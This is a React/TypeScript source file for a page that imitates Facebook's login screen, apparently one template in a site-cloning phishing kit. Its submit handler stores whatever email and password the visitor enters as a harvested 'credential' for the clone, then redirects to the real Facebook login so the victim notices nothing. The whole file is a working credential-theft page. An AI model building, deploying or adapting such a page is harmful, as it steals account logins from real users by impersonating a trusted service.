'use client';
import { useState } from 'react';
import { useClones } from '@/hooks/use-clones';
import type { Clone } from '@/lib/types';

export default function FacebookPage({ clone }: { clone: Clone }) {
  const { addCredential } = useClones();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (email) {
      addCredential(clone.id, { username: email, password });
    }
    window.location.href = 'https://www.facebook.com/login';
  };

  return (
    <div className="bg-[#f0f2f5] min-h-screen flex flex-col items-center justify-center font-sans">
      <div className="w-full max-w-md p-8">
        <div className="text-center mb-8">
          <h1 className="text-5xl font-bold text-[#1877f2] -m-4">facebook</h1>
        </div>
        <div className="bg-white p-6 rounded-lg shadow-lg w-full">
          <p className="text-center text-lg text-gray-800 mb-6">
            Log in to Facebook
          </p>
          <form onSubmit={handleSubmit}>
            <div className="mb-4">
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email address or phone number"
                className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                required
              />
            </div>
            <div className="mb-4">
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
            </div>
            <button
              type="submit"
              className="w-full bg-[#1877f2] text-white py-3 rounded-md font-bold text-xl hover:bg-[#166fe5] transition-colors"
            >
              Log In
            </button>
            <div className="text-center mt-4">
              <a href="#" className="text-sm text-[#1877f2] hover:underline">
                Forgotten password?
              </a>
            </div>
            <hr className="my-6 border-gray-300" />
            <div className="text-center">
              <button
                type="button"
                className="bg-[#42b72a] text-white px-4 py-3 rounded-md font-bold hover:bg-[#36a420] transition-colors"
              >
                Create new account
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
